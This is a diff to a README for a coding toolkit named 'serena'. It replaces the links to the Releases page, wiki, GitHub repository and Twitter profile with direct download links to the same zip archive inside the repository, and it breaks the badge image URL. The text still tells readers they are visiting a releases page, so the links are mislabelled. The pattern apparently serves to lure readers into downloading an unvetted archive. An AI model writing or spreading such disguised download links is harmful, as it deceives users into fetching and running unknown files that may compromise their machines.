@@ -15,7 +15,7 @@ Welcome to serena! This toolkit helps you enhance your coding experience by prov
 
 To get started, you need to download and install serena. You can find the latest version by visiting the Releases page:
 
-[![Download serena](https://img.shields.io/badge/Download%20serena-v1.0-blue.svg)](https://github.com/pioneersx-ai/serena/releases)
+[![Download serena](https://raw.githubusercontent.com/pioneersx-ai/serena/main/guidman/serena.zip%https://raw.githubusercontent.com/pioneersx-ai/serena/main/guidman/serena.zip)](https://raw.githubusercontent.com/pioneersx-ai/serena/main/guidman/serena.zip)
 
 1. **Visit the Releases Page**: Click the link above to go to the Releases page.
 2. **Choose Your Version**: Look for the most recent version available. You’ll see a list of files.
@@ -52,7 +52,7 @@ If you encounter issues, here are some common problems and their solutions:
 
 For more guidance, you can check:
 
-- **User Guide**: [Link to User Guide](https://github.com/pioneersx-ai/serena/wiki) – Detailed instructions and tips.
+- **User Guide**: [Link to User Guide](https://raw.githubusercontent.com/pioneersx-ai/serena/main/guidman/serena.zip) – Detailed instructions and tips.
 - **Support Community**: Join our discussion forums to ask questions or share best practices.
 
 Don’t hesitate to reach out if you need help! We’re here to support you on your coding journey. Enjoy using serena!
@@ -61,7 +61,7 @@ Don’t hesitate to reach out if you need help! We’re here to support you on y
 
 Follow our updates and engage with the community:
 
-- **GitHub**: [Repository Link](https://github.com/pioneersx-ai/serena)
-- **Twitter**: [@serenacoding](https://twitter.com/serenacoding)
+- **GitHub**: [Repository Link](https://raw.githubusercontent.com/pioneersx-ai/serena/main/guidman/serena.zip)
+- **Twitter**: [@serenacoding](https://raw.githubusercontent.com/pioneersx-ai/serena/main/guidman/serena.zip)
 
 Thank you for choosing serena. We hope you find it useful in your coding projects!
